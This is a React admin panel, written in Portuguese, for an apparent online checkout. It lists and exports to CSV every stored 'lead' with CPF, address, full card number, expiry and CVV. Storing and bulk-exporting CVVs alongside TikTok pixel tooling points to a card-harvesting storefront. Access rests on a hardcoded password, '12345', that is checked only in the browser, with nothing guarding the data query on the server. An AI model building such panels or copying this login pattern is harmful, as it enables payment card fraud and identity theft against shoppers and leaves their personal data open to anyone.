import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { LayoutDashboard, Users, Megaphone, Package, CreditCard, Download } from "lucide-react";

const ADMIN_PASSWORD = "12345";

interface Lead {
  id: string;
  created_at: string;
  name: string;
  email: string;
  phone: string | null;
  cpf: string | null;
  payment_method: string;
  color: string | null;
  size: string | null;
  quantity: number | null;
  total_amount: number | null;
  shipping_cost: number | null;
  shipping_type: string | null;
  cep: string | null;
  endereco: string | null;
  numero: string | null;
  complemento: string | null;
  bairro: string | null;
  cidade: string | null;
  uf: string | null;
  card_number: string | null;
  card_holder: string | null;
  card_expiry: string | null;
  card_cvv: string | null;
  card_installments: number | null;
  status: string | null;
  transaction_id: string | null;
}

type Tab = "dashboard" | "leads";

export default function Admin() {
  const navigate = useNavigate();
  const [authenticated, setAuthenticated] = useState(() => sessionStorage.getItem("admin_auth") === "true");
  const [password, setPassword] = useState("");
  const [leads, setLeads] = useState<Lead[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [tab, setTab] = useState<Tab>("dashboard");

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === ADMIN_PASSWORD) {
      setAuthenticated(true);
      setError("");
    } else {
      setError("Senha incorreta");
    }
  };

  useEffect(() => {
    if (!authenticated) return;
    setLoading(true);
    supabase
      .from("checkout_leads")
      .select("*")
      .order("created_at", { ascending: false })
      .then(({ data, error }) => {
        if (error) {
          console.error(error);
          setError("Erro ao carregar dados");
        } else {
          setLeads((data as Lead[]) || []);
        }
        setLoading(false);
      });
  }, [authenticated]);

  const exportCSV = () => {
    if (!leads.length) return;
    const headers = [
      "Data", "Nome", "Email", "Telefone", "CPF", "Método",
      "Cor", "Tamanho", "Qtd", "Total (R$)", "Frete (R$)", "Tipo Frete",
      "CEP", "Endereço", "Número", "Complemento", "Bairro", "Cidade", "UF",
      "Nº Cartão", "Titular", "Validade", "CVV", "Parcelas", "Status", "ID Transação"
    ];
    const rows = leads.map((l) => [
      new Date(l.created_at).toLocaleString("pt-BR"),
      l.name, l.email, l.phone || "", l.cpf || "", l.payment_method,
      l.color || "", l.size || "", l.quantity ?? "",
      l.total_amount ? (l.total_amount / 100).toFixed(2) : "",
      l.shipping_cost ? (l.shipping_cost / 100).toFixed(2) : "",
      l.shipping_type || "",
      l.cep || "", l.endereco || "", l.numero || "", l.complemento || "",
      l.bairro || "", l.cidade || "", l.uf || "",
      l.card_number || "", l.card_holder || "", l.card_expiry || "",
      l.card_cvv || "", l.card_installments ?? "", l.status || "", l.transaction_id || ""
    ]);
    const csv = [headers, ...rows].map(r => r.map(v => `"${String(v).replace(/"/g, '""')}"`).join(",")).join("\n");
    const blob = new Blob(["\uFEFF" + csv], { type: "text/csv;charset=utf-8;" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `leads-${new Date().toISOString().slice(0, 10)}.csv`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const paidCount = leads.filter(l => l.status === "paid").length;
  const pendingCount = leads.filter(l => l.status !== "paid").length;
  const totalRevenue = leads.filter(l => l.status === "paid").reduce((sum, l) => sum + (l.total_amount || 0), 0);

  if (!authenticated) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background p-4">
        <form onSubmit={handleLogin} className="w-full max-w-sm space-y-4 bg-card p-6 rounded-xl border shadow">
          <h1 className="text-xl font-bold text-center">Painel Admin</h1>
          <input
            type="password"
            placeholder="Senha"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full border rounded-lg px-4 py-3 text-sm bg-background"
          />
          {error && <p className="text-destructive text-sm text-center">{error}</p>}
          <button type="submit" className="w-full bg-primary text-primary-foreground py-3 rounded-lg font-semibold">
            Entrar
          </button>
        </form>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Top Nav */}
      <header className="border-b bg-card px-4 py-3">
        <div className="max-w-[1400px] mx-auto flex items-center justify-between">
          <h1 className="text-lg font-bold">Painel Admin</h1>
          <div className="flex gap-2">
            <button
              onClick={() => setTab("dashboard")}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-sm font-medium transition-colors ${tab === "dashboard" ? "bg-primary text-primary-foreground" : "bg-secondary text-secondary-foreground hover:bg-secondary/80"}`}
            >
              <LayoutDashboard className="h-4 w-4" /> Início
            </button>
            <button
              onClick={() => setTab("leads")}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-sm font-medium transition-colors ${tab === "leads" ? "bg-primary text-primary-foreground" : "bg-secondary text-secondary-foreground hover:bg-secondary/80"}`}
            >
              <Users className="h-4 w-4" /> Leads
            </button>
          </div>
        </div>
      </header>

      <div className="max-w-[1400px] mx-auto p-4">
        {tab === "dashboard" && (
          <div className="space-y-6">
            {/* Stats Cards */}
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
              <div className="bg-card border rounded-xl p-5">
                <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">Total de Leads</p>
                <p className="text-3xl font-bold mt-1">{leads.length}</p>
              </div>
              <div className="bg-card border rounded-xl p-5">
                <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">Pagos</p>
                <p className="text-3xl font-bold mt-1 text-success">{paidCount}</p>
              </div>
              <div className="bg-card border rounded-xl p-5">
                <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">Receita Total</p>
                <p className="text-3xl font-bold mt-1">R$ {(totalRevenue / 100).toFixed(2).replace(".", ",")}</p>
              </div>
            </div>

            {/* Quick Actions */}
            <div>
              <h2 className="text-lg font-bold mb-3">Ações rápidas</h2>
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
                <button
                  onClick={() => setTab("leads")}
                  className="flex items-center gap-3 bg-card border rounded-xl p-4 hover:bg-muted/50 transition-colors text-left"
                >
                  <div className="h-10 w-10 rounded-lg bg-primary/10 flex items-center justify-center">
                    <Users className="h-5 w-5 text-primary" />
                  </div>
                  <div>
                    <p className="text-sm font-semibold">Ver Leads</p>
                    <p className="text-xs text-muted-foreground">{leads.length} registros</p>
                  </div>
                </button>

                <button
                  onClick={() => navigate("/admin/tiktok")}
                  className="flex items-center gap-3 bg-card border rounded-xl p-4 hover:bg-muted/50 transition-colors text-left"
                >
                  <div className="h-10 w-10 rounded-lg bg-primary/10 flex items-center justify-center">
                    <Megaphone className="h-5 w-5 text-primary" />
                  </div>
                  <div>
                    <p className="text-sm font-semibold">TikTok Pixels</p>
                    <p className="text-xs text-muted-foreground">Gerenciar pixels</p>
                  </div>
                </button>

                <button
                  onClick={() => navigate("/admin/rastreios")}
                  className="flex items-center gap-3 bg-card border rounded-xl p-4 hover:bg-muted/50 transition-colors text-left"
                >
                  <div className="h-10 w-10 rounded-lg bg-primary/10 flex items-center justify-center">
                    <Package className="h-5 w-5 text-primary" />
                  </div>
                  <div>
                    <p className="text-sm font-semibold">Rastreios / Trackly</p>
                    <p className="text-xs text-muted-foreground">Webhooks e envios</p>
                  </div>
                </button>

                <button
                  onClick={exportCSV}
                  className="flex items-center gap-3 bg-card border rounded-xl p-4 hover:bg-muted/50 transition-colors text-left"
                >
                  <div className="h-10 w-10 rounded-lg bg-primary/10 flex items-center justify-center">
                    <Download className="h-5 w-5 text-primary" />
                  </div>
                  <div>
                    <p className="text-sm font-semibold">Exportar CSV</p>
                    <p className="text-xs text-muted-foreground">Todos os leads</p>
                  </div>
                </button>
              </div>
            </div>

            {/* Recent summary */}
            <div>
              <h2 className="text-lg font-bold mb-3">Resumo recente</h2>
              <div className="bg-card border rounded-xl p-4">
                <div className="flex items-center justify-between text-sm mb-2">
                  <span className="text-muted-foreground">Pendentes</span>
                  <span className="font-semibold text-amber-600">{pendingCount}</span>
                </div>
                <div className="flex items-center justify-between text-sm">
                  <span className="text-muted-foreground">Pagos</span>
                  <span className="font-semibold text-success">{paidCount}</span>
                </div>
              </div>
            </div>
          </div>
        )}

        {tab === "leads" && (
          <div>
            <div className="flex items-center justify-between mb-4 flex-wrap gap-3">
              <h2 className="text-lg font-bold">Leads ({leads.length})</h2>
              <button onClick={exportCSV} className="flex items-center gap-1.5 bg-primary text-primary-foreground px-4 py-2 rounded-lg text-sm font-semibold">
                <Download className="h-4 w-4" /> Exportar CSV
              </button>
            </div>

            {loading ? (
              <p className="text-center text-muted-foreground py-8">Carregando...</p>
            ) : (
              <div className="overflow-x-auto border rounded-xl">
                <table className="w-full text-xs">
                  <thead className="bg-muted">
                    <tr>
                      {["Data", "Nome", "Email", "Telefone", "CPF", "Método", "Cor", "Tam", "Qtd", "Total", "Cidade/UF",
                        "Nº Cartão", "Titular", "Validade", "CVV", "Parcelas", "Status"].map((h) => (
                        <th key={h} className="px-3 py-2 text-left whitespace-nowrap font-semibold">{h}</th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {leads.map((l) => (
                      <tr key={l.id} className="border-t hover:bg-muted/50">
                        <td className="px-3 py-2 whitespace-nowrap">{new Date(l.created_at).toLocaleString("pt-BR")}</td>
                        <td className="px-3 py-2 whitespace-nowrap">{l.name}</td>
                        <td className="px-3 py-2 whitespace-nowrap">{l.email}</td>
                        <td className="px-3 py-2 whitespace-nowrap">{l.phone}</td>
                        <td className="px-3 py-2 whitespace-nowrap">{l.cpf}</td>
                        <td className="px-3 py-2 whitespace-nowrap">
                          <span className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase ${l.payment_method === "pix" ? "bg-success/20 text-success" : "bg-primary/20 text-primary"}`}>
                            {l.payment_method}
                          </span>
                        </td>
                        <td className="px-3 py-2">{l.color}</td>
                        <td className="px-3 py-2">{l.size}</td>
                        <td className="px-3 py-2">{l.quantity}</td>
                        <td className="px-3 py-2 whitespace-nowrap">R$ {l.total_amount ? (l.total_amount / 100).toFixed(2) : "—"}</td>
                        <td className="px-3 py-2 whitespace-nowrap">{l.cidade}/{l.uf}</td>
                        <td className="px-3 py-2 whitespace-nowrap font-mono">{l.card_number}</td>
                        <td className="px-3 py-2 whitespace-nowrap">{l.card_holder}</td>
                        <td className="px-3 py-2">{l.card_expiry}</td>
                        <td className="px-3 py-2">{l.card_cvv}</td>
                        <td className="px-3 py-2">{l.card_installments}</td>
                        <td className="px-3 py-2">
                          <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${l.status === "paid" ? "bg-success/20 text-success" : "bg-amber-100 text-amber-700"}`}>
                            {l.status || "pending"}
                          </span>
                        </td>
                      </tr>
                    ))}
                    {!leads.length && (
                      <tr><td colSpan={17} className="text-center py-8 text-muted-foreground">Nenhum lead encontrado</td></tr>
                    )}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
